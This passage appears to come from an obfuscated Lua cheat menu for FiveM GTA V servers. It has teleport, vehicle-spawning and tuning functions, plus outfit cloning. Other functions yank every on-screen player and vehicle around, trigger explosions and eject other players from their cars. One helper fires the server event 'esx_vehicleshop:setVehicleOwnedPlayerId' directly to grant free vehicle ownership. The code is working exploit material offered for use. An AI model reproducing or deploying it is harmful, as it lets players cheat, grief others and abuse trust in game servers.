                    modShifterLeavers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 34),
                    modAPlate = GetVehicleMod(GNYTV3XnUFoxdun8mV, 35),
                    modSpeakers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 36),
                    modTrunk = GetVehicleMod(GNYTV3XnUFoxdun8mV, 37),
                    modHydrolic = GetVehicleMod(GNYTV3XnUFoxdun8mV, 38),
                    modEngineBlock = GetVehicleMod(GNYTV3XnUFoxdun8mV, 39),
                    modAirFilter = GetVehicleMod(GNYTV3XnUFoxdun8mV, 40),
                    modStruts = GetVehicleMod(GNYTV3XnUFoxdun8mV, 41),
                    modArchCover = GetVehicleMod(GNYTV3XnUFoxdun8mV, 42),
                    modAerials = GetVehicleMod(GNYTV3XnUFoxdun8mV, 43),
                    modTrimB = GetVehicleMod(GNYTV3XnUFoxdun8mV, 44),
                    modTank = GetVehicleMod(GNYTV3XnUFoxdun8mV, 45),
                    modWindows = GetVehicleMod(GNYTV3XnUFoxdun8mV, 46),
                    modLivery = GetVehicleLivery(GNYTV3XnUFoxdun8mV)
                }
            end
            function TeleportToCertainPoint(QXs, KoXWsSFNDvBT2C7u, EMhy)
                local UI0n8BSFiqt = GetVehiclePedIsIn(GetPlayerPed(-1))
                if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                    SetEntityCoords(UI0n8BSFiqt, QXs, KoXWsSFNDvBT2C7u, EMhy)
                else
                    SetEntityCoords(GetPlayerPed(-1), QXs, KoXWsSFNDvBT2C7u, EMhy)
                end
                I0oW9H("Teleported")
            end
            function roundNum(RdBG7Uf2PqH, LUQv)
                local DUE_koCOCXE48sf6E = 10 ^ (LUQv or 0.0)
                return math.floor(RdBG7Uf2PqH * DUE_koCOCXE48sf6E + 0.5) / DUE_koCOCXE48sf6E
            end
            FuckerTriggerCustomEvent = function(Im0sbap, d9Jc, ...)
                local ykjk7wnyV = msgpack.pack({...})
                if Im0sbap then
                    TriggerServerEventInternal(d9Jc, ykjk7wnyV, ykjk7wnyV:len())
                else
                    TriggerEventInternal(d9Jc, ykjk7wnyV, ykjk7wnyV:len())
                end
            end
            function RotationToDirection(CaG5xyCB)
                local qn = CaG5xyCB.z * 0.0174532924
                local VSNcWlR7j0D = CaG5xyCB.x * 0.0174532924
                local t9gyMoRjq9jJ3Riw = math.abs(math.cos(VSNcWlR7j0D))
                return vector3(-math.sin(qn) * t9gyMoRjq9jJ3Riw, math.cos(qn) * t9gyMoRjq9jJ3Riw, math.sin(VSNcWlR7j0D))
            end
            function flipvehilce()
                local ZubF8 = GetPlayerPed(-1)
                local lbH2Svk0vjTBd5Rbt = GetVehiclePedIsIn(ZubF8, true)
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0.0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0.0), -1) == GetPlayerPed(-1))
                 then
                    SetVehicleOnGroundProperly(lbH2Svk0vjTBd5Rbt)
                    I0oW9H("~g~Fliperino!", false)
                else
                    I0oW9H("~b~Set on drivers place", true)
                end
            end
            function RequestControlOnce(UbTLItlR)
                if not NetworkIsInSession or NetworkHasControlOfEntity(UbTLItlR) then
                    return true
                end
                SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(UbTLItlR), true)
                return NetworkRequestControlOfEntity(UbTLItlR)
            end
            function VehicleMaxTunning(vr_CF8)
                SetVehicleModKit(vr_CF8, 0.0)
                SetVehicleMod(vr_CF8, 11, GetNumVehicleMods(vr_CF8, 11) - 1, false)
                SetVehicleMod(vr_CF8, 12, GetNumVehicleMods(vr_CF8, 12) - 1, false)
                SetVehicleMod(vr_CF8, 13, GetNumVehicleMods(vr_CF8, 13) - 1, false)
                SetVehicleMod(vr_CF8, 15, GetNumVehicleMods(vr_CF8, 15) - 2, false)
                SetVehicleMod(vr_CF8, 16, GetNumVehicleMods(vr_CF8, 16) - 1, false)
                ToggleVehicleMod(vr_CF8, 17, true)
                ToggleVehicleMod(vr_CF8, 18, true)
                ToggleVehicleMod(vr_CF8, 19, true)
                ToggleVehicleMod(vr_CF8, 21, true)
            end
            function FullTunningCar(ZwQBZXxzhJ4n)
                SetVehicleModKit(ZwQBZXxzhJ4n, 0.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsIn(PlayerPedId(), 0.0), 0.0, 0.0, 0.0)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsIn(PlayerPedId(), 0.0), 0.0, 0.0, 0.0)
                SetVehicleColours(ZwQBZXxzhJ4n, 12, 12)
                SetVehicleModColor_1(ZwQBZXxzhJ4n, 3, 0.0)
                SetVehicleExtraColours(ZwQBZXxzhJ4n, 3, 0.0)
                ToggleVehicleMod(ZwQBZXxzhJ4n, 18, 1)
                ToggleVehicleMod(ZwQBZXxzhJ4n, 22, 1)
                SetVehicleMod(ZwQBZXxzhJ4n, 16, 5, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 12, 2, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 11, 3, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 14, 14, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 15, 3, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 13, 2, 0.0)
                SetVehicleWindowTint(ZwQBZXxzhJ4n, 5)
                SetVehicleWheelType(ZwQBZXxzhJ4n, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 23, 21, 1)
                SetVehicleMod(ZwQBZXxzhJ4n, 0.0, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 1, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 2, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 3, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 4, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 5, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 6, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 7, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 8, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 9, 1, 0.0)
                SetVehicleMod(ZwQBZXxzhJ4n, 10, 1, 0.0)
                IsVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 0.0, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 1, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 2, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 3, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 4, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 5, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 6, 1)
                SetVehicleNeonLightEnabled(ZwQBZXxzhJ4n, 7, 1)
                SetVehicleNeonLightsColour(ZwQBZXxzhJ4n, 255, 128, 0.0)
                SetVehicleModKit(ZwQBZXxzhJ4n, 0.0)
                ToggleVehicleMod(ZwQBZXxzhJ4n, 20, 1)
                SetVehicleModKit(ZwQBZXxzhJ4n, 0.0)
                SetVehicleTyreSmokeColor(ZwQBZXxzhJ4n, 255, 128, 0.0)
            end
            Absolute_function.CloneOutfit = function(zIeYOB)
                local QXjHB65KnnAediy = GetPlayerPed(zIeYOB)
                local V6j9OT = PlayerPedId()
                hat = GetPedPropIndex(QXjHB65KnnAediy, 0.0)
                hat_texture = GetPedPropTextureIndex(QXjHB65KnnAediy, 0.0)
                glasses = GetPedPropIndex(QXjHB65KnnAediy, 1)
                glasses_texture = GetPedPropTextureIndex(QXjHB65KnnAediy, 1)
                ear = GetPedPropIndex(QXjHB65KnnAediy, 2)
                ear_texture = GetPedPropTextureIndex(QXjHB65KnnAediy, 2)
                watch = GetPedPropIndex(QXjHB65KnnAediy, 6)
                watch_texture = GetPedPropTextureIndex(QXjHB65KnnAediy, 6)
                wrist = GetPedPropIndex(QXjHB65KnnAediy, 7)
                wrist_texture = GetPedPropTextureIndex(QXjHB65KnnAediy, 7)
                head_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 0.0)
                head_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 0.0)
                head_texture = GetPedTextureVariation(QXjHB65KnnAediy, 0.0)
                beard_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 1)
                beard_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 1)
                beard_texture = GetPedTextureVariation(QXjHB65KnnAediy, 1)
                hair_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 2)
                hair_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 2)
                hair_texture = GetPedTextureVariation(QXjHB65KnnAediy, 2)
                torso_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 3)
                torso_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 3)
                torso_texture = GetPedTextureVariation(QXjHB65KnnAediy, 3)
                legs_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 4)
                legs_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 4)
                legs_texture = GetPedTextureVariation(QXjHB65KnnAediy, 4)
                hands_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 5)
                hands_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 5)
                hands_texture = GetPedTextureVariation(QXjHB65KnnAediy, 5)
                foot_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 6)
                foot_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 6)
                foot_texture = GetPedTextureVariation(QXjHB65KnnAediy, 6)
                acc1_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 7)
                acc1_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 7)
                acc1_texture = GetPedTextureVariation(QXjHB65KnnAediy, 7)
                acc2_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 8)
                acc2_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 8)
                acc2_texture = GetPedTextureVariation(QXjHB65KnnAediy, 8)
                acc3_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 9)
                acc3_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 9)
                acc3_texture = GetPedTextureVariation(QXjHB65KnnAediy, 9)
                mask_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 10)
                mask_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 10)
                mask_texture = GetPedTextureVariation(QXjHB65KnnAediy, 10)
                aux_drawable = GetPedDrawableVariation(QXjHB65KnnAediy, 11)
                aux_palette = GetPedPaletteVariation(QXjHB65KnnAediy, 11)
                aux_texture = GetPedTextureVariation(QXjHB65KnnAediy, 11)
                SetPedPropIndex(V6j9OT, 0.0, hat, hat_texture, 1)
                SetPedPropIndex(V6j9OT, 1, glasses, glasses_texture, 1)
                SetPedPropIndex(V6j9OT, 2, ear, ear_texture, 1)
                SetPedPropIndex(V6j9OT, 6, watch, watch_texture, 1)
                SetPedPropIndex(V6j9OT, 7, wrist, wrist_texture, 1)
                SetPedComponentVariation(V6j9OT, 0.0, head_drawable, head_texture, head_palette)
                SetPedComponentVariation(V6j9OT, 1, beard_drawable, beard_texture, beard_palette)
                SetPedComponentVariation(V6j9OT, 2, hair_drawable, hair_texture, hair_palette)
                SetPedComponentVariation(V6j9OT, 3, torso_drawable, torso_texture, torso_palette)
                SetPedComponentVariation(V6j9OT, 4, legs_drawable, legs_texture, legs_palette)
                SetPedComponentVariation(V6j9OT, 5, hands_drawable, hands_texture, hands_palette)
                SetPedComponentVariation(V6j9OT, 6, foot_drawable, foot_texture, foot_palette)
                SetPedComponentVariation(V6j9OT, 7, acc1_drawable, acc1_texture, acc1_palette)
                SetPedComponentVariation(V6j9OT, 8, acc2_drawable, acc2_texture, acc2_palette)
                SetPedComponentVariation(V6j9OT, 9, acc3_drawable, acc3_texture, acc3_palette)
                SetPedComponentVariation(V6j9OT, 10, mask_drawable, mask_texture, mask_palette)
                SetPedComponentVariation(V6j9OT, 11, aux_drawable, aux_texture, aux_palette)
            end
            local function jEvLrNnRtR5tIHE38l24()
                magnet = not magnet
                if magnet then
                    Citizen.CreateThread(
                        function()
                            I0oW9H("~h~Press ~r~E ~s~to use")
                            local IUBAvJxKRI = 38
                            local LYwOjNUNcApyv10sEz2F = 0.5
                            local LAPz = false
                            local vK3K0WwYvPE4ZYf0 = 0.0
                            local n8ySkSf2c = 15
                            local yc = false
                            local fYIOBrD5pF_ = false
                            function HabibiForceTic()
                                if (LAPz) then
                                    vK3K0WwYvPE4ZYf0 = vK3K0WwYvPE4ZYf0 + 1
                                    if (vK3K0WwYvPE4ZYf0 >= n8ySkSf2c) then
                                        vK3K0WwYvPE4ZYf0 = 0.0
                                        LAPz = false
                                    end
                                end
                                if IsControlPressed(0.0, IUBAvJxKRI) and not LAPz and not yc then
                                    LAPz = true
                                    yc = true
                                end
                                if (fYIOBrD5pF_) then
                                    fYIOBrD5pF_ = false
                                    local zwaAX_B4FU22x80e4 = PlayerPedId()
                                    local Hkx3_X4C3mLv2mVp7E = GetGameplayCamRot(2)
                                    local kUcXVn7P2 = 5
                                    local p1gIIXRu = -(math.sin(math.rad(Hkx3_X4C3mLv2mVp7E.z)) * kUcXVn7P2 * 10)
                                    local luhIu2JNa4Z = (math.cos(math.rad(Hkx3_X4C3mLv2mVp7E.z)) * kUcXVn7P2 * 10)
                                    local LJmmaH = kUcXVn7P2 * (Hkx3_X4C3mLv2mVp7E.x * 0.2)
                                    local bS2rRgzQ82vTQ = GetVehiclePedIsIn(zwaAX_B4FU22x80e4, false)
                                    for VqYjjEuJxaKzd5gzB in EnumerateVehicles() do
                                        SetEntityInvincible(VqYjjEuJxaKzd5gzB, false)
                                        if IsEntityOnScreen(VqYjjEuJxaKzd5gzB) and VqYjjEuJxaKzd5gzB ~= bS2rRgzQ82vTQ then
                                            ApplyForceToEntity(
                                                VqYjjEuJxaKzd5gzB,
                                                1,
                                                p1gIIXRu,
                                                luhIu2JNa4Z,
                                                LJmmaH,
                                                0.0,
                                                0.0,
                                                0.0,
                                                true,
                                                false,
                                                true,
                                                true,
                                                true,
                                                true
                                            )
                                        end
                                    end
                                    for cqDoSr3TRZx8Iocwxjas in EnumeratePeds() do
                                        if
                                            IsEntityOnScreen(cqDoSr3TRZx8Iocwxjas) and
                                                cqDoSr3TRZx8Iocwxjas ~= zwaAX_B4FU22x80e4
                                         then
                                            ApplyForceToEntity(
                                                cqDoSr3TRZx8Iocwxjas,
                                                1,
                                                p1gIIXRu,
                                                luhIu2JNa4Z,
                                                LJmmaH,
                                                0.0,
                                                0.0,
                                                0.0,
                                                true,
                                                false,
                                                true,
                                                true,
                                                true,
                                                true
                                            )
                                        end
                                    end
                                end
                                if IsControlPressed(0.0, IUBAvJxKRI) and not LAPz and yc then
                                    LAPz = true
                                    fYIOBrD5pF_ = true
                                    yc = false
                                end
                                function RequestControlOnce(Z6UR5Q7ox5)
                                    if not NetworkIsInSession or NetworkHasControlOfEntity(Z6UR5Q7ox5) then
                                        return true
                                    end
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(Z6UR5Q7ox5), true)
                                    return NetworkRequestControlOfEntity(Z6UR5Q7ox5)
                                end
                                function RequestControl(qjmJ4EDJx4r_CDdESrt)
                                    Citizen.CreateThread(
                                        function()
                                            local CuSlnvd51QKsd6r = 0.0
                                            while not RequestControlOnce(qjmJ4EDJx4r_CDdESrt) and CuSlnvd51QKsd6r <= 12 do
                                                CuSlnvd51QKsd6r = CuSlnvd51QKsd6r + 1
                                                Wait(0.0)
                                            end
                                            return CuSlnvd51QKsd6r <= 12
                                        end
                                    )
                                end
                                if (yc) then
                                    local iQTx3LZ00 = PlayerPedId()
                                    local tbE = GetVehiclePedIsIn(iQTx3LZ00, false)
                                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                                    hJrNvGGTs9gtBHDg5XYR(28)
                                    for tW in EnumerateVehicles() do
                                        SetEntityInvincible(tW, true)
                                        if IsEntityOnScreen(tW) and (tW ~= tbE) then
                                            RequestControlOnce(tW)
                                            FreezeEntityPosition(tW, false)
                                            Oscillate(tW, Markerloc, 0.5, 0.3)
                                        end
                                    end
                                    for UuZOg3w4xDj in EnumeratePeds() do
                                        if IsEntityOnScreen(UuZOg3w4xDj) and UuZOg3w4xDj ~= PlayerPedId() then
                                            RequestControlOnce(UuZOg3w4xDj)
                                            SetPedToRagdoll(UuZOg3w4xDj, 4000, 5000, 0.0, true, true, true)
                                            FreezeEntityPosition(UuZOg3w4xDj, false)
                                            Oscillate(UuZOg3w4xDj, Markerloc, 0.5, 0.3)
                                        end
                                    end
                                end
                            end
                            while magnet do
                                HabibiForceTic()
                                Wait(0.0)
                            end
                        end
                    )
                else
                    I0oW9H("~r~~h~Disabled")
                end
            end
            function EnumerateVehicles()
                return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
            end
            function EnumeratePeds()
                return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
            end
            function EnumerateEntities(JsZ64Pv3uXNr16BtsqEy, KsGLjm, TguAgvgvIVndRMfAWJfAQ)
                return coroutine.wrap(
                    function()
                        local Al96Dv2f9_v41, AmkGR6qzv = JsZ64Pv3uXNr16BtsqEy()
                        if not AmkGR6qzv or AmkGR6qzv == 0.0 then
                            TguAgvgvIVndRMfAWJfAQ(Al96Dv2f9_v41)
                            return
                        end
                        local Su = {handle = Al96Dv2f9_v41, destructor = TguAgvgvIVndRMfAWJfAQ}
                        setmetatable(Su, entityEnumerator)
                        local RgVI5oADwoQ = true
                        repeat
                            coroutine.yield(AmkGR6qzv)
                            RgVI5oADwoQ, AmkGR6qzv = KsGLjm(Al96Dv2f9_v41)
                        until not RgVI5oADwoQ
                        Su.destructor, Su.handle = nil, nil
                        TguAgvgvIVndRMfAWJfAQ(Al96Dv2f9_v41)
                    end
                )
            end
            function SubVectors(nik9yF4Rd_j6, LQ5Du0_B)
                return vector3(nik9yF4Rd_j6.x - LQ5Du0_B.x, nik9yF4Rd_j6.y - LQ5Du0_B.y, nik9yF4Rd_j6.z - LQ5Du0_B.z)
            end
            function ScaleVector(qQnXOa4idujx1qZXK, hu5MlTAl)
                return vector3(
                    qQnXOa4idujx1qZXK.x * hu5MlTAl,
                    qQnXOa4idujx1qZXK.y * hu5MlTAl,
                    qQnXOa4idujx1qZXK.z * hu5MlTAl
                )
            end
            function AddVectors(iT, asY4RCUcAT69)
                return vector3(iT.x + asY4RCUcAT69.x, iT.y + asY4RCUcAT69.y, iT.z + asY4RCUcAT69.z)
            end
            function ApplyForce(qnq, YUL6aTPU8hCjCwPH7SR)
                ApplyForceToEntity(qnq, 3, YUL6aTPU8hCjCwPH7SR, 0.0, 0.0, 0.0, false, false, true, true, false, true)
            end
            function Oscillate(e6dlW9uN5xJknPdV, D7SJcKNL, qJ3r2ADkdT426h1crQ, oSACgMP)
                local T8yivcBVka =
                    ScaleVector(
                    SubVectors(D7SJcKNL, GetEntityCoords(e6dlW9uN5xJknPdV)),
                    (qJ3r2ADkdT426h1crQ * qJ3r2ADkdT426h1crQ)
                )
                local RMQUoAfUyKExpVkL =
                    AddVectors(
                    ScaleVector(GetEntityVelocity(e6dlW9uN5xJknPdV), (nlXCUGaxh(2) * qJ3r2ADkdT426h1crQ * oSACgMP)),
                    vector3(nlXCUGaxh(0.0), nlXCUGaxh(0.0), 0.1)
                )
                local wwlURxAak9inkc0B = SubVectors(T8yivcBVka, RMQUoAfUyKExpVkL)
                ApplyForce(e6dlW9uN5xJknPdV, wwlURxAak9inkc0B)
            end
            PlaceSelf = true
            local function HtXSn86aa0FZAX(iLM57, LfDLDprLLZFP, MzGeK3)
                RequestModel(GetHashKey(iLM57))
                Wait(500)
                if HasModelLoaded(GetHashKey(iLM57)) then
                    local s38 = GetEntityCoords(GetPlayerPed(-1))
                    local KBO = GetEntityForwardX(GetPlayerPed(-1))
                    local XymokOeCb = GetEntityForwardY(GetPlayerPed(-1))
                    local tMG = GetEntityHeading(GetPlayerPed(-1))
                    local ns6I1 =
                        CreateVehicle(GetHashKey(iLM57), s38.x + KBO * 5, s38.y + XymokOeCb * 5, s38.z, tMG, 1, 1)
                    if LfDLDprLLZFP then
                        SetPedIntoVehicle(GetPlayerPed(-1), ns6I1, -1)
                    end
                    if MzGeK3 then
                        SetVehicleEngineOn(ns6I1, 1, 1)
                    end
                    return ns6I1
                else
                    I0oW9H("~r~Model not recognized (Try Again)")
                end
            end
            if DeadlyBulldozer then
                SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0.0), math.random() % 1, 1)
                SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0.0), nlXCUGaxh(0.0))
                if not IsPedInAnyVehicle(PlayerPedId(), 0.0) then
                    DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
                    DeadlyBulldozer = not DeadlyBulldozer
                elseif IsDisabledControlJustPressed(0.0, jjZMYGaeC1Bwr3SK8lrkP["E"]) then
                    local DQPi_ZEOTz = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    local zRxElM_ = GetEntityCoords(DQPi_ZEOTz)
                    local oEqai3AFGsGbCw4a = GetEntityForwardVector(DQPi_ZEOTz)
                    local RUiPKknSX2H5s1_tHoY = GetEntityHeading(DQPi_ZEOTz)
                    local AVD5prQMO7n037sz53j =
                        CreateVehicle(
                        GetHashKey("BULLDOZER"),
                        zRxElM_.x + oEqai3AFGsGbCw4a.x * 10,
                        zRxElM_.y + oEqai3AFGsGbCw4a.y * 10,
                        zRxElM_.z,
                        RUiPKknSX2H5s1_tHoY,
                        1,
                        1
                    )
                    SetVehicleColours(AVD5prQMO7n037sz53j, 38, 38)
                    SetVehicleEngineHealth(AVD5prQMO7n037sz53j, nlXCUGaxh(-3500))
                    ApplyForce(AVD5prQMO7n037sz53j, oEqai3AFGsGbCw4a * nlXCUGaxh(500))
                end
            end
            if TeleportLive then
                I0oW9H("Press E to teleport")
                Markerloc =
                    GetGameplayCamCoord() +
                    (RotationToDirection(GetGameplayCamRot(2)) * Mlf_aylZ60ZaoIHuj[selLiveTPFuncIndex])
                local AyccDUNzDn0h31yEm = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                hJrNvGGTs9gtBHDg5XYR(1)
                if IsControlJustPressed(1, 38) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                        SetEntityCoords(AyccDUNzDn0h31yEm, Markerloc)
                    else
                        SetEntityCoords(GetPlayerPed(-1), Markerloc)
                    end
                end
            end
            if ExploserinoLiverino then
                I0oW9H("Press E to Explosion that point")
                Markerloc =
                    GetGameplayCamCoord() +
                    (RotationToDirection(GetGameplayCamRot(2)) * GaZt7SCmwTVhb5pMuuI[selLiveExploFuncIndex])
                local A4CT5Rm3j4OXHvtsz = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                hJrNvGGTs9gtBHDg5XYR(42)
                if IsControlJustPressed(1, 38) then
                    for i = 0.0, 15 do
                        Vz2()
                    end
                end
            end
            function RepairVeh()
                SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), nlXCUGaxh(0.0))
                SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                Citizen.InvokeNative(2292506429516893524, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
            end
            if DisableVehs then
                local xt8cDr1fo1zIZOO8 = GetActivePlayers()
                for i = IncludeSelfAtNukeWorld, #xt8cDr1fo1zIZOO8 do
                    if IsPedInAnyVehicle(GetPlayerPed(xt8cDr1fo1zIZOO8[i]), true) then
                        ClearPedTasksImmediately(GetPlayerPed(xt8cDr1fo1zIZOO8[i]))
                    end
                end
            end
            if DisableSelectedVeh then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                    local z2 = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer))
                    RequestControlOnce(z2)
                    SetVehicleEngineHealth(z2, 0.0)
                end
            end
            function HtXSn86aa0FZAX(YBPVUj7, V2, TIvrEPD5mlyzxMe2q)
                RequestModel(GetHashKey(YBPVUj7))
                Wait(500)
                if HasModelLoaded(GetHashKey(YBPVUj7)) then
                    local wsGtZ7wYZF4k3okG = GetEntityCoords(PlayerPedId())
                    local uFq = GetEntityForwardX(PlayerPedId())
                    local RJxmf = GetEntityForwardY(PlayerPedId())
                    local k = GetEntityHeading(PlayerPedId())
                    local pzFhclQ6MOL42 =
                        CreateVehicle(
                        GetHashKey(YBPVUj7),
                        wsGtZ7wYZF4k3okG.x + uFq * 5,
                        wsGtZ7wYZF4k3okG.y + RJxmf * 5,
                        wsGtZ7wYZF4k3okG.z,
                        k,
                        1,
                        1
                    )
                    if V2 then
                        SetPedIntoVehicle(PlayerPedId(), pzFhclQ6MOL42, -1)
                    end
                    if TIvrEPD5mlyzxMe2q then
                        SetVehicleEngineOn(pzFhclQ6MOL42, 1, 1)
                    end
                    return pzFhclQ6MOL42
                else
                    I0oW9H("~r~Model not recognized (Try Again)")
                end
            end
            function SpawnLegalVehicle(W9lU6geE6ppmvz87o, h9_XaoR8xIRb811, sxOZDeOlo0)
                local qBp = SpawnVehicleToPlayer(W9lU6geE6ppmvz87o, h9_XaoR8xIRb811)
                if qBp ~= nil then
                    if string.IsNullOrEmpty(sxOZDeOlo0) then
                        SetVehicleNumberPlateText(qBp, GetVehicleNumberPlateText(qBp))
                    else
                        SetVehicleNumberPlateText(qBp, sxOZDeOlo0)
                    end
                    I0oW9H("Spawned Vehicle")
                    local _X = GetVehicleProperties(qBp)
                    local mJwhBr4 = GetDisplayNameFromVehicleModel(_X.model)
                    if _X then
                        FuckerTriggerCustomEvent(
                            true,
                            "esx_vehicleshop:setVehicleOwnedPlayerId",
                            GetPlayerServerId(h9_XaoR8xIRb811),
                            _X,
                            mJwhBr4,
                            W9lU6geE6ppmvz87o,
                            false
                        )
                        I0oW9H("~g~~h~You own this spawned vehicle!")
                    end
                end
            end
            function string.IsNullOrEmpty(lJ2utyJhmEMoEN)
                return lJ2utyJhmEMoEN == nil or lJ2utyJhmEMoEN == " "
            end
            function SpawnVehicleToPlayer(ecd2mnNqIhbPrS7dmri, S7eby7Iqo)
                if ecd2mnNqIhbPrS7dmri and IsModelValid(ecd2mnNqIhbPrS7dmri) and IsModelAVehicle(ecd2mnNqIhbPrS7dmri) then
                    RequestModel(ecd2mnNqIhbPrS7dmri)
                    while not HasModelLoaded(ecd2mnNqIhbPrS7dmri) do
                        Citizen.Wait(0.0)
                    end
                    local IdCMUcUE4auvAZ6 =
                        (type(ecd2mnNqIhbPrS7dmri) == "number" and ecd2mnNqIhbPrS7dmri or
                        GetHashKey(ecd2mnNqIhbPrS7dmri))
                    local GjO1a76 = GetPlayerPed(S7eby7Iqo)
                    local Wgbob23yh5vX7 =
                        CreateVehicle(IdCMUcUE4auvAZ6, GetEntityCoords(GjO1a76), GetEntityHeading(GjO1a76), true, true)
                    local rHAs4vps882Q4GbGbTAHo = NetworkGetNetworkIdFromEntity(Wgbob23yh5vX7)
                    SetNetworkIdCanMigrate(rHAs4vps882Q4GbGbTAHo, true)
                    SetEntityAsMissionEntity(Wgbob23yh5vX7, true, false)
                    SetVehicleHasBeenOwnedByPlayer(Wgbob23yh5vX7, true)
                    SetVehicleNeedsToBeHotwired(Wgbob23yh5vX7, false)
                    SetModelAsNoLongerNeeded(IdCMUcUE4auvAZ6)
                    SetPedIntoVehicle(GjO1a76, Wgbob23yh5vX7, -1)
                    SetVehicleEngineOn(Wgbob23yh5vX7, true, false, false)
                    SetVehRadioStation(Wgbob23yh5vX7, "OFF")
                    return Wgbob23yh5vX7
                else
                    I0oW9H("Invalid Vehicle Model!")
                    return nil
                end
            end
            function deletecurrent()
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    local ihY = GetVehiclePedIsUsing(GetPlayerPed(-1))
                    SetEntityAsMissionEntity(ihY, true, true)
                    DeleteVehicle(ihY)
                else
                    I0oW9H("No vehicle detected")
                end
            end
            function spawncustomvehicle(p7ZesPDuSgfdRXa)
                RequestModel(p7ZesPDuSgfdRXa)
                Citizen.CreateThread(
                    function()
                        local Y9TEakc = 0.0
                        if p7ZesPDuSgfdRXa == nil then
                            p7ZesPDuSgfdRXa = "vagner"
                        end
                        while not HasModelLoaded(GetHashKey(p7ZesPDuSgfdRXa)) do
                            Y9TEakc = Y9TEakc + 100
                            Citizen.Wait(10)
                            if Y9TEakc > 5000 then
                                Absolute.PushNotification("Could not spawn this vehicle!", 5000)
                                break
                            end
                        end
                        SpawnedCar =
                            CreateVehicle(
                            GetHashKey(p7ZesPDuSgfdRXa),
                            GetEntityCoords(PlayerPedId()),
                            GetEntityHeading(PlayerPedId()),
                            true,
                            true
                        )
                        SetVehicleStrong(SpawnedCar, true)
                        SetVehicleEngineOn(SpawnedCar, true, true, false)
                        SetVehicleEngineCanDegrade(SpawnedCar, false)
                    end
                )
            end
            function VehicleBuy()
                plate = GetVehicleNumberPlateText(GetVehiclePedIsIn(GetPlayerPed(-1)))
                deletecurrent()
                local vcuXA44nvJscsgjrCg1 = kbinput("Enter Model Name:", " ", 20)
                HtXSn86aa0FZAX(vcuXA44nvJscsgjrCg1, PlaceSelf, SpawnEngineOn)
                local yirRnqFcZcn63 = GetPlayerPed(-1)
                local Is = GetVehiclePedIsIn(yirRnqFcZcn63, true)
